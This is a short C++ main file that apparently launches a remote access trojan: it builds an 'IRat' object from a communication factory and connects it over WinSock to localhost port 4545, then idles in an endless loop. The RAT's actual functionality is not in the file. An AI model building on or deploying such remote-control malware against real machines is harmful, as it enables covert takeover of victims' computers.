#include "ICommunicationFactory.h"
#include "IRat.h"

int main() {
	const auto factory = CreateFactory();

	const std::unique_ptr<IRat> rat = CreateRat(
		factory.get(),
		factory->CreateWinSockConnectionFactory("localhost", 4545));

	while (true)
	{
	}

	return 0;
}
